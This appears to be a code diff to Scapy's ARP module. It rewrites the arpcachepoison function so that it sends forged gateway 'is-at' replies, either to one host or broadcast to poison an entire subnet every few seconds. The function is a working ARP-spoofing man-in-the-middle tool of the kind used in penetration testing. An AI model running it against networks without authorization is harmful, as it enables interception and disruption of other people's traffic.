@@ -441,17 +441,23 @@ conf.l3types.register(ETH_P_ARP, ARP)
 
 
 @conf.commands.register
-def arpcachepoison(target, victim, interval=60):
-    """Poison target's cache with (your MAC,victim's IP) couple
-arpcachepoison(target, victim, [interval=60]) -> None
-"""
-    tmac = getmacbyip(target)
-    p = Ether(dst=tmac)/ARP(op="who-has", psrc=victim, pdst=target)
+def arpcachepoison(gWay, target = None, interval = 3):
+    """Poison an ARP cache with your MAC Address
+    Where gWay is the Gateway for the subnet, use the following as an example:
+    arpcachepoison(gWay, [target = None], [interval = 3])
+    If no target is declared, then poison the whole subnet.
+    """
+    if target is None:
+        p = Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(op = "is-at", hwdst = 'ff:ff:ff:ff:ff:ff', psrc = gWay)
+    else:
+        tmac = getmacbyip(target)
+        p = Ether(dst = tmac)/ARP(op = "is-at", psrc = gWay, pdst = target)
     try:
         while 1:
             sendp(p, iface_hint=target)
             if conf.verb > 1:
                 os.write(1,".")
+            p.show()
             time.sleep(interval)
     except KeyboardInterrupt:
         pass
